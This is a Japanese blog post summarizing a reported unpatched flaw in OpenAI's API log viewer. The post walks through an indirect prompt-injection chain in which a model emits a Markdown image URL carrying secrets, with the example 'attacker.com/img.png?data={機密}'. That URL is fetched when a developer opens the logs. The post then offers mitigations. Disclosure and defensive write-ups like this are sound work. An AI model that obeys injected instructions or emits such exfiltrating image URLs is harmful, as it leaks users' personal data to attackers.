---
layout: post
title: "OpenAI API Logs: Unpatched data exfiltration - OpenAI API ログ：未修正のデータ流出"
date: 2026-01-21T23:05:27.707Z
categories: [tech, world-news]
tags: [tech-news, japan]
source_url: "https://www.promptarmor.com/resources/openai-api-logs-unpatched-data-exfiltration"
source_title: "OpenAI API Logs: Unpatched Data Exfiltration"
source_id: 46710569
excerpt: "OpenAIのAPIログがMarkdown画像で閲覧時に機密を外部送信する脆弱性判明"
image: "https://framerusercontent.com/images/jWVs5Mzd96INudIjcuU4uwmd4.png?width=1116&amp;height=661"
---

# OpenAI API Logs: Unpatched data exfiltration - OpenAI API ログ：未修正のデータ流出
開発者が開く「ログ」で機密が漏れる？OpenAIのAPIログビューアに潜む画像経由のデータ流出手口

## 要約
OpenAIのAPIログビューアがMarkdown画像の扱いにより、アプリ側でブロックしたはずの悪意ある出力を開発者がログ閲覧した瞬間に外部へ送信（データ流出）してしまう脆弱性が確認されました。報告はOpenAIに通知されたものの「Not applicable」でクローズされています。

## この記事を読むべき理由
- 日本でも銀行やフィンテック、SaaSがOpenAIをサブプロセッサとして利用する例が増加中。KYCや決済まわりの個人情報（PII）漏洩リスクは法令（個人情報保護法）・事業継続に直結します。
- アプリ側での防御があっても、プラットフォーム側ログの表示で穴が生まれる可能性がある点は運用者／開発者が必ず知っておくべき問題です。

## 詳細解説
1. 背景  
   - OpenAIの「responses」「conversations」APIログはMarkdownレンダリングで表示される。これにより、モデルが生成したMarkdown画像タグのURLに機密データを埋め込むと、ログビューアがその画像を取得する際に攻撃者のサーバへ機密が含まれた完全なリクエストURLが送られる。
2. 攻撃チェーン（要点）  
   - 攻撃者が外部データソースを汚染（間接的プロンプトインジェクション）。  
   - ユーザーがその会話をトリガーし、AIが悪意あるMarkdown画像を生成（例：attacker.com/img.png?data={機密}）。  
   - アプリ側ではLLMジャッジやサニタイズ等で表示がブロックされる。  
   - しかしフラグされた会話を開発者がOpenAIのログで調査すると、ログビューアがMarkdownをレンダリングして画像を取得→攻撃者がURLから機密を回収。
3. 影響範囲  
   - Responses / Conversations APIを使う全アプリ、Agent Builder / Assistant Builder / Chat Builderのプレビュー環境、ChatKit Playground、Starter ChatKit、Widget Builder 等のテスト用インターフェース。  
   - アプリ側で画像レンダリングを禁止していても、プラットフォームログが別の攻撃面を提供する点が問題。
4. 責任ある公開と対応状況  
   - 研究はBugCrowd経由で報告されたが「Not Applicable」としてクローズ。これを受けて公表されたのは、利用者側で注意喚起を行うため。

## 実践ポイント
- ログに機密データを送らない：送信前にPIIをマスキング／トークン化してAPIに渡す。  
- 出力のサニタイズ：モデル出力からMarkdown画像タグや外部URLを完全除去するパイプラインを実装。  
- ログ閲覧制限：プラットフォームのログを開ける権限を厳格にし、レビュー時は隔離された環境で表示（ネットワーク非公開）する。  
- ネットワーク監視：OpenAIプラットフォームや開発環境からの外部画像取得（アウトバウンド）を検出・遮断するルールを導入。  
- サプライチェーン確認：ベンダーがどのAPI（responses等）を使っているかを確認し、リスクを評価。  
- 法務・コンプライアンス対応：金融・個人情報を扱う事業はAPPIや業界ガイドラインに基づく追加対策を検討。  
- ベンダーにエスカレーション：影響を受ける可能性がある場合はOpenAIやサービス提供者へ情報提供と対応を求める。

短く言えば、「アプリで防いでもログで漏れる」リスクが現実に起きうるため、ログ運用・サニタイズ・権限管理・ネットワーク制御を即実施してください。
